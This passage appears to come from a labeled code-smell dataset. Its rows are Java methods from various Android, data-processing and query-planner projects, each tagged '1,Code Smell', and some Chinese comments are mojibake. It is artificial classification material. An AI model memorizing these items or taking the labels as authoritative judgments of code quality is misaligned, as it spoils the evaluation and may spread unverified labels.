  if (visibleItemCount > 0 && !dialogsSearchAdapter.isMessagesSearchEndReached() && (lastVisibleItem == totalItemCount - 1 || dialogsSearchAdapter.delegate != null && dialogsSearchAdapter.delegate.getSearchForumDialogId() != 0 && dialogsSearchAdapter.localMessagesLoadingRow >= 0 && firstVisibleItem <= dialogsSearchAdapter.localMessagesLoadingRow && lastVisibleItem >= dialogsSearchAdapter.localMessagesLoadingRow)) {
    dialogsSearchAdapter.loadMoreSearchMessages();
  }
  fragmentView.invalidateBlur();
}
@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  super.onScrolled(recyclerView,dx,dy);
  fragmentView.invalidateBlur();
}
@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  super.onScrolled(recyclerView,dx,dy);
  fragmentView.invalidateBlur();
}
@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  super.onScrolled(recyclerView,dx,dy);
  fragmentView.invalidateBlur();
}",1,Code Smell
"public static String getFileUUID(FileMessageBean fileMessageBean){
  if (fileMessageBean != null && fileMessageBean.getV2TIMMessage() != null && fileMessageBean.getV2TIMMessage().getFileElem() != null) {
    return fileMessageBean.getV2TIMMessage().getFileElem().getUUID();
  }
  return null;
}",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_ON && model != null) {
    XposedHelpers.callMethod(model,""onAppIconChanged"",BuildConfig.APPLICATION_ID,UserHandle.getUserHandleForUid(0));
  }
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  model=param.thisObject;
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_ON && TaskbarRadiusOverride != 1f) {
    param.setResult(Math.round((int)param.getResult() * TaskbarRadiusOverride));
  }
}
@SuppressLint(""DiscouragedApi"") @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_DEFAULT)   return;
  boolean taskbarEnabled=taskbarMode == TASKBAR_ON;
  if (taskbarEnabled) {
    numShownHotseatIcons=getIntField(param.thisObject,""numShownHotseatIcons"") + (TaskbarHideAllAppsIcon ? 1 : 0);
    Resources res=mContext.getResources();
    setObjectField(param.thisObject,taskbarHeightField,res.getDimensionPixelSize(res.getIdentifier(""taskbar_size"",""dimen"",mContext.getPackageName())));
    setObjectField(param.thisObject,stashedTaskbarHeightField,res.getDimensionPixelSize(res.getIdentifier(""taskbar_stashed_size"",""dimen"",mContext.getPackageName())));
    if (taskbarHeightOverride != 1f) {
      setObjectField(param.thisObject,taskbarHeightField,Math.round(getIntField(param.thisObject,taskbarHeightField) * taskbarHeightOverride));
    }
  }
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_ON && TaskbarAsRecents && mItemsLength > 0)   ((View)param.args[0]).setOnClickListener(listener);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  TaskBarView=(ViewGroup)param.thisObject;
  if (taskbarMode == TASKBAR_ON && TaskbarHideAllAppsIcon)   setObjectField(TaskBarView,""mAllAppsButton"",null);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  recentTasksList=param.thisObject;
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  TaskbarModelCallbacks=param.thisObject;
}",1,Code Smell
"@Override public void deserialize(SourceRecord record,Collector<T> out) throws Exception {
  deserializer.deserialize(record,new CallbackCollector<>(inputRow -> {
    if (sourceMetricData != null) {
      sourceMetricData.outputMetricsWithEstimate(record.value());
    }
    out.collect(inputRow);
  }
));
}
@Override public void deserialize(SourceRecord record,Collector<T> out,TableChange tableSchema) throws Exception {
  deserializer.deserialize(record,new CallbackCollector<>(inputRow -> {
    if (sourceMetricData != null && record != null && migrateAll) {
      Struct value=(Struct)record.value();
      Struct source=value.getStruct(Envelope.FieldName.SOURCE);
      String dbName=source.getString(AbstractSourceInfo.DATABASE_NAME_KEY);
      String schemaName=source.getString(AbstractSourceInfo.SCHEMA_NAME_KEY);
      String tableName=source.getString(AbstractSourceInfo.TABLE_NAME_KEY);
      SnapshotRecord snapshotRecord=SnapshotRecord.fromSource(source);
      boolean isSnapshotRecord=(SnapshotRecord.TRUE == snapshotRecord);
      sourceMetricData.outputMetricsWithEstimate(dbName,schemaName,tableName,isSnapshotRecord,value);
    }
 else     if (sourceMetricData != null && record != null) {
      sourceMetricData.outputMetricsWithEstimate(record.value());
    }
    out.collect(inputRow);
  }
),tableSchema);
}
",1,Code Smell
"@Override public int read(ExtractorInput input,PositionHolder seekPosition) throws IOException, InterruptedException {
  int currentFileSize=(int)input.getLength();
  if (sampleSize == sampleData.length) {
    sampleData=Arrays.copyOf(sampleData,(currentFileSize != C.LENGTH_UNSET ? currentFileSize : sampleData.length) * 3 / 2);
  }
  int bytesRead=input.read(sampleData,sampleSize,sampleData.length - sampleSize);
  if (bytesRead != C.RESULT_END_OF_INPUT) {
    sampleSize+=bytesRead;
    if (currentFileSize == C.LENGTH_UNSET || sampleSize != currentFileSize) {
      return Extractor.RESULT_CONTINUE;
    }
  }
  processSample();
  return Extractor.RESULT_END_OF_INPUT;
}",1,Code Smell
"protected static Authenticator getAuthenticator(final OAuth2Client oAuth2Client,final OAuth2State OAuth2State){
  return (route,response) -> {
    String credential="""";
    OAuth2State.nextState();
    if (OAuth2State.isBasicAuth()) {
      credential=Credentials.basic(oAuth2Client.getUsername(),oAuth2Client.getPassword());
    }
 else     if (OAuth2State.isAuthorizationAuth()) {
      credential=Credentials.basic(oAuth2Client.getClientId(),oAuth2Client.getClientSecret());
    }
 else     if (OAuth2State.isFinalAuth()) {
      return null;
    }
    return response.request().newBuilder().header(OAuth2Constant.HEADER_AUTHORIZATION,credential).build();
  }
;
}",1,Code Smell
"/** 
 * Skips scaling_list_data(). See H.265/HEVC (2014) 7.3.4.
 */
private static void skipScalingList(ParsableNalUnitBitArray bitArray){
  for (int sizeId=0; sizeId < 4; sizeId++) {
    for (int matrixId=0; matrixId < 6; matrixId+=sizeId == 3 ? 3 : 1) {
      if (!bitArray.readBit()) {
        bitArray.readUnsignedExpGolombCodedInt();
      }
 else {
        int coefNum=Math.min(64,1 << (4 + (sizeId << 1)));
        if (sizeId > 1) {
          bitArray.readSignedExpGolombCodedInt();
        }
        for (int i=0; i < coefNum; i++) {
          bitArray.readSignedExpGolombCodedInt();
        }
      }
    }
  }
}",1,Code Smell
"public void onPrepared(){
  Log.i(TAG,""onPrepared "" + "" ["" + this.hashCode() + ""] "");
  state=STATE_PREPARED;
  if (!preloading) {
    mediaInterface.start();
    preloading=false;
  }
  if (jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""mp3"") || jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""wma"") || jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""aac"")|| jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""m4a"")|| jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""wav"")) {
    onStatePlaying();
  }
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public static void spawnForChunk(ServerLevel world,LevelChunk chunk,NaturalSpawner.SpawnState manager,boolean flag,boolean flag1,boolean flag2){
  world.getProfiler().push(""spawner"");
  MobCategory[] classifications=SPAWNING_CATEGORIES;
  LevelData worldInfo=world.getLevelData();
  for (  MobCategory classification : classifications) {
    boolean spawnThisTick=true;
    int limit=classification.getMaxInstancesPerChunk();
    SpawnCategory spawnCategory=CraftSpawnCategory.toBukkit(classification);
    if (CraftSpawnCategory.isValidForLimits(spawnCategory)) {
      spawnThisTick=((WorldBridge)world).bridge$ticksPerSpawnCategory().getLong(spawnCategory) != 0 && worldInfo.getGameTime() % ((WorldBridge)world).bridge$ticksPerSpawnCategory().getLong(spawnCategory) == 0;
      limit=((WorldBridge)world).bridge$getWorld().getSpawnLimit(spawnCategory);
    }
    if (spawnThisTick) {
      if (limit != 0) {
        if ((flag || !classification.isFriendly()) && (flag1 || classification.isFriendly()) && (flag2 || !classification.isPersistent())&& ((WorldEntitySpawnerBridge.EntityDensityManagerBridge)manager).bridge$canSpawn(classification,chunk.getPos(),limit)) {
          spawnCategoryForChunk(classification,world,chunk,((WorldEntitySpawnerBridge.EntityDensityManagerBridge)manager)::bridge$canSpawn,((WorldEntitySpawnerBridge.EntityDensityManagerBridge)manager)::bridge$updateDensity);
        }
      }
    }
  }
  world.getProfiler().pop();
}",1,Code Smell
"/** 
 * Creates a  {@link Sort} by expressions, with limit and offset. 
 */
public RelBuilder sortLimit(int offset,int fetch,RexNode... nodes){
  return sortLimit(offset,fetch,ImmutableList.copyOf(nodes));
}
/** 
 * Creates a  {@link Sort} by a list of expressions, with limit and offset.
 * @param offset Number of rows to skip; non-positive means don't skip any
 * @param fetch Maximum number of rows to fetch; negative means no limit
 * @param nodes Sort expressions
 */
public RelBuilder sortLimit(int offset,int fetch,Iterable<? extends RexNode> nodes){
  final Registrar registrar=new Registrar(fields());
  final List<RelFieldCollation> fieldCollations=registrar.registerFieldCollations(nodes);
  final RexNode offsetNode=offset <= 0 ? null : literal(offset);
  final RexNode fetchNode=fetch < 0 ? null : literal(fetch);
  if (offsetNode == null && fetch == 0) {
    return empty();
  }
  if (offsetNode == null && fetchNode == null && fieldCollations.isEmpty()) {
    return this;
  }
  if (fieldCollations.isEmpty()) {
    assert registrar.addedFieldCount() == 0;
    RelNode top=peek();
    if (top instanceof Sort) {
      final Sort sort2=(Sort)top;
      if (sort2.offset == null && sort2.fetch == null) {
        replaceTop(sort2.getInput());
        final RelNode sort=sortFactory.createSort(peek(),sort2.collation,offsetNode,fetchNode);
        replaceTop(sort);
        return this;
      }
    }
    if (top instanceof Project) {
      final Project project=(Project)top;
      if (project.getInput() instanceof Sort) {
        final Sort sort2=(Sort)project.getInput();
        if (sort2.offset == null && sort2.fetch == null) {
          final RelNode sort=sortFactory.createSort(sort2.getInput(),sort2.collation,offsetNode,fetchNode);
          replaceTop(projectFactory.createProject(sort,project.getProjects(),Pair.right(project.getNamedProjects())));
          return this;
        }
      }
    }
  }
  if (registrar.addedFieldCount() > 0) {
    project(registrar.extraNodes);
  }
  final RelNode sort=sortFactory.createSort(peek(),RelCollations.of(fieldCollations),offsetNode,fetchNode);
  replaceTop(sort);
  if (registrar.addedFieldCount() > 0) {
    project(registrar.originalExtraNodes);
  }
  return this;
}",1,Code Smell
"/** 
 * 鍟嗘満闃舵鎺ㄨ繘
 * @param businessStatusBO data
 */
@Override public void boostBusinessStatus(CrmBusinessStatusBO businessStatusBO){
  CrmBusiness byId=crmBusinessService.getById(businessStatusBO.getBusinessId());
  if (byId.getStatus() != 3) {
    String statusName="""";
    if (businessStatusBO.getIsEnd() == null) {
      CrmBusinessChange change=new CrmBusinessChange();
      change.setBusinessId(businessStatusBO.getBusinessId());
      change.setStatusId(businessStatusBO.getStatusId());
      change.setCreateTime(DateUtil.date());
      change.setCreateUserId(UserUtil.getUserId());
      crmBusinessChangeService.save(change);
      byId.setStatusId(businessStatusBO.getStatusId());
      crmBusinessService.updateById(byId);
      CrmBusinessStatus one=crmBusinessStatusService.lambdaQuery().select(CrmBusinessStatus::getName).eq(CrmBusinessStatus::getStatusId,businessStatusBO.getStatusId()).one();
      statusName=one.getName();
    }
 else {
      if (businessStatusBO.getIsEnd() == 1) {
        statusName=""璧㈠崟"";
      }
 else       if (businessStatusBO.getIsEnd() == 2) {
        statusName=""杈撳崟"";
      }
 else       if (businessStatusBO.getIsEnd() == 3) {
        statusName=""鏃犳晥"";
      }
      byId.setIsEnd(businessStatusBO.getIsEnd());
      byId.setStatusRemark(businessStatusBO.getStatusRemark());
      crmBusinessService.updateById(byId);
    }
    crmActivityService.addActivity(3,CrmActivityEnum.BUSINESS,businessStatusBO.getBusinessId(),statusName);
    Map<String,Object> map=new HashMap<>();
    if (businessStatusBO.getIsEnd() == null) {
      map.put(""statusId"",businessStatusBO.getStatusId());
    }
 else {
      map.put(""isEnd"",businessStatusBO.getIsEnd());
      map.put(""statusId"",null);
    }
    map.put(""statusName"",statusName);
    ApplicationContextHolder.getBean(CrmBusinessServiceImpl.class).updateField(map,Collections.singletonList(byId.getBusinessId()));
  }
}",1,Code Smell
"@Override protected void configure(HttpClientTestOptions.Builder optionsBuilder){
  optionsBuilder.markAsLowLevelInstrumentation();
  optionsBuilder.setMaxRedirects(21);
  optionsBuilder.setHttpAttributes(uri -> {
    Set<AttributeKey<?>> attributes=new HashSet<>(HttpClientTestOptions.DEFAULT_HTTP_ATTRIBUTES);
    if (""http://localhost:61/"".equals(uri.toString()) || ""https://192.0.2.1/"".equals(uri.toString()) || ""http://192.0.2.1/"".equals(uri.toString())|| resolveAddress(""/read-timeout"").toString().equals(uri.toString())) {
      attributes.remove(NETWORK_PROTOCOL_VERSION);
    }
    return attributes;
  }
);
}",1,Code Smell
"/** 
 * 鍠滄
 */
public static String modifyLike(HashMap<String,String> data,String original) throws Exception {
  String cookie=ExtraHelper.getExtraDate(ExtraHelper.COOKIE);
  String pid=ExtraHelper.getExtraDate(ExtraHelper.LOVE_PLAY_LIST);
  if (original.contains(""\""code\"":200"") || cookie.equals(""-1"") || pid.equals(""-1""))   return original;
  HashMap<String,Object> header=new HashMap<>();
  header.put(""Cookie"",cookie);
  JSONObject paramJSON=decrypt(data.get(""params""));
  String trackId=paramJSON.getString(""trackId"");
  HashMap<String,Object> param=new HashMap<>();
  param.put(""trackIds"",""[\"""" + trackId + ""\"",\""""+ trackId+ ""\""]"");
  param.put(""op"",""add"");
  param.put(""pid"",pid);
  String result=new Http(""POST"",""http://music.163.com/api/playlist/manipulate/tracks"",param,header).getResult();
  if (result.contains(""502"") || result.contains(""200""))   result=""{\""playlistId\"":"" + pid + "",\""code\"":200}"";
  return result;
}",1,Code Smell
"@Override public void onEnd(ReadableSpan span){
  if (span != null && (exportUnsampledSpans || span.getSpanContext().isSampled())) {
    worker.addSpan(span);
  }
}
",1,Code Smell
"public void loadXray(String absPath){
  String targetDir=Paths.get(absPath).toFile().getParent() + File.separator;
  XrayUtil.rmAllConfig(targetDir);
  Runtime.getRuntime().addShutdownHook(new Thread(() -> XrayUtil.rmAllConfig(targetDir)));
  xrayPathTextField.setText(absPath);
  if (!OSUtil.isWindows()) {
    ExecUtil.chmod(absPath);
  }
  String[] cmd=new String[]{absPath};
  Thread t=new Thread(() -> ExecUtil.execCmdNoRet(cmd));
  t.start();
  if (OSUtil.isMacOS() && (!StringUtil.notEmpty(db.getLastXrayPath()) || db.getLastXrayPath().equals(""null""))) {
    if (LANG == CHINESE) {
      JOptionPane.showMessageDialog(this.SuperXray,Const.MacNeedAgree);
    }
 else {
      JOptionPane.showMessageDialog(this.SuperXray,Const.MacNeedAgreeEn);
    }
  }
  try {
    Thread.sleep(1000);
    t.interrupt();
  }
 catch (  Exception ex) {
    ex.printStackTrace();
  }
  XrayUtil.cpAllConfig(targetDir);
  try {
    Path configPathPath=Paths.get(targetDir + Const.ConfigYaml);
    configPath=configPathPath.toFile().getAbsolutePath();
    Files.write(configPathPath,configStr.getBytes(StandardCharsets.UTF_8));
  }
 catch (  Exception ex) {
    ex.printStackTrace();
  }
  xrayCmd.setXray(absPath);
  stop=false;
  execAndFresh(cmd);
}",1,Code Smell
"@SuppressLint(""RtlHardcoded"") @Override public boolean onKeyDown(int keyCode,KeyEvent e,TerminalSession currentSession){
  if (handleVirtualKeys(keyCode,e,true))   return true;
  if (keyCode == KeyEvent.KEYCODE_ENTER && !currentSession.isRunning()) {
    mTermuxTerminalSessionActivityClient.removeFinishedSession(currentSession);
    return true;
  }
 else   if (!mActivity.getProperties().areHardwareKeyboardShortcutsDisabled() && e.isCtrlPressed() && e.isAltPressed()) {
    int unicodeChar=e.getUnicodeChar(0);
    if (keyCode == KeyEvent.KEYCODE_DPAD_DOWN || unicodeChar == 'n') {
      mTermuxTerminalSessionActivityClient.switchToSession(true);
    }
 else     if (keyCode == KeyEvent.KEYCODE_DPAD_UP || unicodeChar == 'p') {
      mTermuxTerminalSessionActivityClient.switchToSession(false);
    }
 else     if (keyCode == KeyEvent.KEYCODE_DPAD_RIGHT) {
      mActivity.getDrawer().smoothRightOpen();
    }
 else     if (keyCode == KeyEvent.KEYCODE_DPAD_LEFT) {
      mActivity.getDrawer().smoothClose();
    }
 else     if (unicodeChar == 'k') {
      onToggleSoftKeyboardRequest();
    }
 else     if (unicodeChar == 'm') {
      mActivity.getTerminalView().showContextMenu();
    }
 else     if (unicodeChar == 'r') {
      mTermuxTerminalSessionActivityClient.renameSession(currentSession);
    }
 else     if (unicodeChar == 'c') {
      mTermuxTerminalSessionActivityClient.addNewSession(false,null);
    }
 else     if (unicodeChar == 'u') {
      showUrlSelection();
    }
 else     if (unicodeChar == 'v') {
      doPaste();
    }
 else     if (unicodeChar == '+' || e.getUnicodeChar(KeyEvent.META_SHIFT_ON) == '+') {
      changeFontSize(true);
    }
 else     if (unicodeChar == '-') {
      changeFontSize(false);
    }
 else     if (unicodeChar >= '1' && unicodeChar <= '9') {
      int index=unicodeChar - '1';
      mTermuxTerminalSessionActivityClient.switchToSession(index);
    }
    return true;
  }
  return false;
}",1,Code Smell
"/** 
 * Builds the correct intent for the device version to select media. <p>For Device version > T or R_SDK_v2, use the android platform photopicker via {@link MediaStore#ACTION_PICK_IMAGES}<p>For earlier versions use the built in docs ui via  {@link Intent#ACTION_GET_CONTENT}
 */
private void openFilePicker(){
  Intent intent;
  boolean usePhotoPicker=UiUtils.isPhotoPickerAvailable();
  if (usePhotoPicker) {
    intent=new Intent(MediaStore.ACTION_PICK_IMAGES);
    if (mediaViewController.getMaxAttachments() - mediaViewController.getMediaAttachmentsCount() > 1)     intent.putExtra(MediaStore.EXTRA_PICK_IMAGES_MAX,mediaViewController.getMaxAttachments() - mediaViewController.getMediaAttachmentsCount());
  }
 else {
    intent=new Intent(Intent.ACTION_GET_CONTENT);
    intent.addCategory(Intent.CATEGORY_OPENABLE);
    intent.setType(""*/*"");
  }
  if (!usePhotoPicker && instance.configuration != null && instance.configuration.mediaAttachments != null && instance.configuration.mediaAttachments.supportedMimeTypes != null && !instance.configuration.mediaAttachments.supportedMimeTypes.isEmpty()) {
    intent.putExtra(Intent.EXTRA_MIME_TYPES,instance.configuration.mediaAttachments.supportedMimeTypes.toArray(new String[0]));
  }
 else {
    if (!usePhotoPicker) {
      intent.putExtra(Intent.EXTRA_MIME_TYPES,new String[]{""image/*"",""video/*""});
    }
  }
  intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE,true);
  startActivityForResult(intent,MEDIA_RESULT);
}",1,Code Smell
"private String getFiatValue(Double value){
  UnitFormat format=Config.get().getUnitFormat() == null ? UnitFormat.DOT : Config.get().getUnitFormat();
  return format.tableFormatCurrencyValue(value);
}
private Double getFiatValue(TransactionEntry txEntry,Map<Date,Double> fiatRates){
  Double dayRate=null;
  if (txEntry.getBlockTransaction().getDate() == null) {
    if (AppServices.getFiatCurrencyExchangeRate() != null) {
      dayRate=AppServices.getFiatCurrencyExchangeRate().getBtcRate();
    }
  }
 else {
    dayRate=fiatRates.get(DateUtils.truncate(txEntry.getBlockTransaction().getDate(),Calendar.DAY_OF_MONTH));
  }
  if (dayRate != null) {
    return dayRate * txEntry.getValue() / Transaction.SATOSHIS_PER_BITCOIN;
  }
  return null;
}
",1,Code Smell
"@Override public boolean dispatchNestedPreScroll(int dx,int dy,int[] consumed,int[] offsetInWindow,int type){
  consumed[1]=0;
  if (nestedScrollStarted && (overScrollY > 0 && dy > 0 || overScrollY < 0 && dy < 0)) {
    final float delta=overScrollY - dy;
    if (overScrollY > 0) {
      if (delta < 0) {
        overScrollY=0;
        consumed[1]+=dy + delta;
      }
 else {
        overScrollY=delta;
        consumed[1]+=dy;
      }
    }
 else {
      if (delta > 0) {
        overScrollY=0;
        consumed[1]+=dy + delta;
      }
 else {
        overScrollY=delta;
        consumed[1]+=dy;
      }
    }
    captionTextview.setTranslationY(overScrollY);
    textSelectionHelper.invalidate();
    return true;
  }
  return false;
}",1,Code Smell
"public String replaceUrl(String before){
  boolean showDetail=Dev.show_url_detail;
  if (showDetail)   Common.showLog(""HostManager before "" + before);
  if (Shaft.sSettings.isUsePixivCat() && !TextUtils.isEmpty(before) && before.contains(HOST_OLD)) {
    String finalUrl=before.replace(HOST_OLD,HOST_NEW);
    if (showDetail)     Common.showLog(""HostManager after0 "" + finalUrl);
    return finalUrl;
  }
 else   if (Shaft.sSettings.isAutoFuckChina() && before.contains(HOST_OLD)) {
    String result=resizeUrl(before);
    if (showDetail)     Common.showLog(""HostManager after1 "" + result);
    return result;
  }
 else {
    if (showDetail)     Common.showLog(""HostManager after1 "" + before);
    return before;
  }
}",1,Code Smell
"private <C extends Comparable<C>>RexNode simplifyUsingPredicates(RexNode e,Class<C> clazz){
  final Comparison comparison=Comparison.of(e);
  if (comparison == null || comparison.kind == SqlKind.NOT_EQUALS || comparison.literal.getValue() == null) {
    return e;
  }
  final C v0=comparison.literal.getValueAs(clazz);
  final Range<C> range=range(comparison.kind,v0);
  final Range<C> range2=residue(comparison.ref,range,predicates.pulledUpPredicates,clazz);
  if (range2 == null) {
    return rexBuilder.makeLiteral(false);
  }
 else   if (range2.equals(range)) {
    return e;
  }
 else   if (range2.equals(Range.all())) {
    return simplify(rexBuilder.makeCall(SqlStdOperatorTable.IS_NOT_NULL,comparison.ref),RexUnknownAs.UNKNOWN);
  }
 else   if (range2.lowerEndpoint().equals(range2.upperEndpoint())) {
    if (range2.lowerBoundType() == BoundType.OPEN || range2.upperBoundType() == BoundType.OPEN) {
      return rexBuilder.makeLiteral(false);
    }
    return rexBuilder.makeCall(SqlStdOperatorTable.EQUALS,comparison.ref,rexBuilder.makeLiteral(range2.lowerEndpoint(),comparison.literal.getType(),comparison.literal.getTypeName()));
  }
 else {
    return e;
  }
}",1,Code Smell
"private void findTarOrJar(List<File> list,File path){
  for (  File file : path.listFiles()) {
    if (file.isDirectory()) {
      if (""target"".equals(file.getName())) {
        File tar=null;
        File jar=null;
        for (        File targetFile : file.listFiles()) {
          if (targetFile.getName().endsWith(""tar.gz"")) {
            tar=targetFile;
            break;
          }
          if (!targetFile.getName().startsWith(""original-"") && !targetFile.getName().endsWith(""-sources.jar"") && targetFile.getName().endsWith(Constants.JAR_SUFFIX)) {
            if (jar == null) {
              jar=targetFile;
            }
 else {
              if (targetFile.length() > jar.length()) {
                jar=targetFile;
              }
            }
          }
        }
        File target=tar == null ? jar : tar;
        if (target != null) {
          list.add(target);
        }
      }
 else {
        findTarOrJar(list,file);
      }
    }
  }
}
",1,Code Smell
"public static String stringForMessageListDate(long date){
  try {
    date*=1000;
    Calendar rightNow=Calendar.getInstance();
    int day=rightNow.get(Calendar.DAY_OF_YEAR);
    rightNow.setTimeInMillis(date);
    int dateDay=rightNow.get(Calendar.DAY_OF_YEAR);
    if (Math.abs(System.currentTimeMillis() - date) >= 31536000000L) {
      return getInstance().formatterYear.format(new Date(date));
    }
 else {
      int dayDiff=dateDay - day;
      if (dayDiff == 0 || dayDiff == -1 && System.currentTimeMillis() - date < 60 * 60 * 8* 1000) {
        return getInstance().formatterDay.format(new Date(date));
      }
 else       if (dayDiff > -7 && dayDiff <= -1) {
        return getInstance().formatterWeek.format(new Date(date));
      }
 else       if (usePersianCalendar) {
        return new PersianDate(date).getPersianMonthDay();
      }
 else {
        return getInstance().formatterDayMonth.format(new Date(date));
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return ""LOC_ERR"";
}",1,Code Smell
"public void dismissLockView(){
  if (state != STATE_NORMAL && state != STATE_ERROR && state != STATE_AUTO_COMPLETE) {
    post(() -> {
      lock.setVisibility(GONE);
    }
);
  }
}
",1,Code Smell
"@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  if (spoilerEffect2 != null && child == imageView) {
    boolean r=super.drawChild(canvas,child,drawingTime);
    if (hasSpoiler && spoilerRevealProgress != 1f && (photoEntry == null || !photoEntry.isAttachSpoilerRevealed)) {
      if (spoilerRevealProgress != 0f) {
        canvas.save();
        path.rewind();
        path.addCircle(spoilerRevealX,spoilerRevealY,spoilerMaxRadius * spoilerRevealProgress,Path.Direction.CW);
        canvas.clipPath(path,Region.Op.DIFFERENCE);
      }
      float alphaProgress=CubicBezierInterpolator.DEFAULT.getInterpolation(1f - imageViewCrossfadeProgress);
      float alpha=hasSpoiler ? alphaProgress : 1f - alphaProgress;
      spoilerEffect2.draw(canvas,container,imageView.getMeasuredWidth(),imageView.getMeasuredHeight());
      if (spoilerRevealProgress != 0f) {
        canvas.restore();
      }
    }
    return r;
  }
  return super.drawChild(canvas,child,drawingTime);
}",1,Code Smell
"private void updateTitle(boolean shutdown){
  MessageObject messageObject=MediaController.getInstance().getPlayingMessageObject();
  if (messageObject == null && shutdown || messageObject != null && !(messageObject.isMusic() || messageObject.isVoice())) {
    dismiss();
  }
 else {
    if (messageObject == null) {
      lastMessageObject=null;
      return;
    }
    final boolean sameMessageObject=messageObject == lastMessageObject;
    lastMessageObject=messageObject;
    if (messageObject.eventId != 0 || messageObject.getId() <= -2000000000) {
      optionsButton.setVisibility(View.INVISIBLE);
    }
 else {
      optionsButton.setVisibility(View.VISIBLE);
    }
    final long dialogId=messageObject.getDialogId();
    final boolean noforwards=(dialogId < 0 && MessagesController.getInstance(currentAccount).isChatNoForwards(-dialogId) || MessagesController.getInstance(currentAccount).isChatNoForwards(messageObject.getChatId()) || messageObject.messageOwner.noforwards) && !NaConfig.INSTANCE.getForceCopy().Bool();
    if (noforwards) {
      optionsButton.hideSubItem(1);
      optionsButton.hideSubItem(2);
      optionsButton.hideSubItem(5);
      optionsButton.setAdditionalYOffset(-AndroidUtilities.dp(16));
    }
 else {
      optionsButton.showSubItem(1);
      optionsButton.showSubItem(2);
      optionsButton.showSubItem(5);
      optionsButton.setAdditionalYOffset(-AndroidUtilities.dp(157));
    }
    checkIfMusicDownloaded(messageObject);
    updateProgress(messageObject,!sameMessageObject);
    updateCover(messageObject,!sameMessageObject);
    if (MediaController.getInstance().isMessagePaused()) {
      playPauseDrawable.setPause(false);
      playButton.setContentDescription(LocaleController.getString(""AccActionPlay"",R.string.AccActionPlay));
    }
 else {
      playPauseDrawable.setPause(true);
      playButton.setContentDescription(LocaleController.getString(""AccActionPause"",R.string.AccActionPause));
    }
    String title=messageObject.getMusicTitle();
    String author=messageObject.getMusicAuthor();
    titleTextView.setText(title);
    authorTextView.setText(author);
    int duration=lastDuration=(int)messageObject.getDuration();
    if (durationTextView != null) {
      durationTextView.setText(duration != 0 ? AndroidUtilities.formatShortDuration(duration) : ""-:--"");
    }
    if (duration > 60 * 10) {
      playbackSpeedButton.setVisibility(View.VISIBLE);
    }
 else {
      playbackSpeedButton.setVisibility(View.GONE);
    }
    if (!sameMessageObject) {
      preloadNeighboringThumbs();
    }
  }
}",1,Code Smell
"/** 
 * Writes content.
 */
public void content(String content){
  if (content != null) {
    indent++;
    final char[] chars=content.toCharArray();
    int prev=0;
    for (int i=0; i < chars.length; i++) {
      if (chars[i] == '\n' || chars[i] == '\r' && i + 1 < chars.length && chars[i + 1] == '\n') {
        displayIndent(out,indent);
        out.println(content.substring(prev,i));
        if (chars[i] == '\r') {
          ++i;
        }
        prev=i + 1;
      }
    }
    displayIndent(out,indent);
    out.println(content.substring(prev,chars.length));
    indent--;
    out.flush();
  }
  tagsWritten++;
}",1,Code Smell
"/** 
 * Parses the given line with a class member mapping and processes the results with the given mapping processor.
 */
private void processClassMemberMapping(String className,String line,MappingProcessor mappingProcessor){
  int colonIndex1=line.indexOf(':');
  int colonIndex2=colonIndex1 < 0 ? -1 : line.indexOf(':',colonIndex1 + 1);
  int spaceIndex=line.indexOf(' ',colonIndex2 + 2);
  int argumentIndex1=line.indexOf('(',spaceIndex + 1);
  int argumentIndex2=argumentIndex1 < 0 ? -1 : line.indexOf(')',argumentIndex1 + 1);
  int colonIndex3=argumentIndex2 < 0 ? -1 : line.indexOf(':',argumentIndex2 + 1);
  int colonIndex4=colonIndex3 < 0 ? -1 : line.indexOf(':',colonIndex3 + 1);
  int arrowIndex=line.indexOf(""->"",(colonIndex4 >= 0 ? colonIndex4 : colonIndex3 >= 0 ? colonIndex3 : argumentIndex2 >= 0 ? argumentIndex2 : spaceIndex) + 1);
  if (spaceIndex < 0 || arrowIndex < 0) {
    return;
  }
  String type=line.substring(colonIndex2 + 1,spaceIndex).trim();
  String name=line.substring(spaceIndex + 1,argumentIndex1 >= 0 ? argumentIndex1 : arrowIndex).trim();
  String newName=line.substring(arrowIndex + 2).trim();
  String newClassName=className;
  int dotIndex=name.lastIndexOf('.');
  if (dotIndex >= 0) {
    className=name.substring(0,dotIndex);
    name=name.substring(dotIndex + 1);
  }
  if (type.length() > 0 && name.length() > 0 && newName.length() > 0) {
    if (argumentIndex2 < 0) {
      mappingProcessor.processFieldMapping(className,type,name,newClassName,newName);
    }
 else {
      int firstLineNumber=0;
      int lastLineNumber=0;
      int newFirstLineNumber=0;
      int newLastLineNumber=0;
      if (colonIndex2 >= 0) {
        firstLineNumber=newFirstLineNumber=Integer.parseInt(line.substring(0,colonIndex1).trim());
        lastLineNumber=newLastLineNumber=Integer.parseInt(line.substring(colonIndex1 + 1,colonIndex2).trim());
      }
      if (colonIndex3 >= 0) {
        firstLineNumber=Integer.parseInt(line.substring(colonIndex3 + 1,colonIndex4 > 0 ? colonIndex4 : arrowIndex).trim());
        lastLineNumber=colonIndex4 < 0 ? firstLineNumber : Integer.parseInt(line.substring(colonIndex4 + 1,arrowIndex).trim());
      }
      String arguments=line.substring(argumentIndex1 + 1,argumentIndex2).trim();
